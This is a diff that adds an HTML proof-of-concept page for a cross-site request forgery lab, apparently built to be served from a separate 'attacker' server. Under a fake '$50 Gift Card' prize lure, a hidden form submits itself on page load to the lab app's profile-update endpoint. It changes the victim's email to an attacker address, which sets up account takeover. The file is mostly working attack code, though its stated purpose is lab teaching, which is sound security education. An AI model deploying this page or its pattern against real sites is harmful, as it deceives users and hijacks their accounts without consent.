@@ -1,0 +1,65 @@
+<!doctype html>
+<!--
+    CSRF Proof-of-Concept - "Attacker Website" - LAB USE ONLY
+
+    This page is meant to be served from its OWN server, on a
+    DIFFERENT port than the lab app (see attacker_server.py in this
+    same folder) - simulating a real attacker-controlled website
+    living at its own domain, completely separate from the lab app.
+-->
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>You've Won a Prize! 🎉</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            max-width: 480px;
+            margin: 4rem auto;
+            text-align: center;
+            color: #1a1a1a;
+        }
+        h1 { color: #d4380d; }
+        .prize-box {
+            border: 2px dashed #ffb400;
+            background: #fffbe6;
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+        }
+        .claim-btn {
+            background: #52c41a;
+            color: white;
+            border: none;
+            padding: 0.75rem 2rem;
+            font-size: 1.1rem;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        .fine-print { color: #999; font-size: 0.8rem; margin-top: 2rem; }
+    </style>
+</head>
+<body>
+    <h1>🎉 Congratulations!</h1>
+    <div class="prize-box">
+        <p><strong>You've been randomly selected</strong> to receive a<br>
+        <span style="font-size:1.5rem;">$50 Gift Card</span></p>
+    </div>
+    <p>Click below to confirm and claim your prize before it expires.</p>
+    <button class="claim-btn" onclick="document.getElementById('status').innerText='Verifying... please wait.'">
+        Claim My Prize
+    </button>
+    <p id="status"></p>
+    <p class="fine-print">Limited time offer. One per household.</p>
+
+    <form id="csrf-form" action="http://127.0.0.1:5000/profile/update" method="POST" style="display:none">
+        <input type="email" name="email" value="hacked-by-csrf@attacker.com">
+    </form>
+
+    <script>
+        window.addEventListener('load', function() {
+            document.getElementById('csrf-form').submit();
+        });
+    </script>
+</body>
+</html>
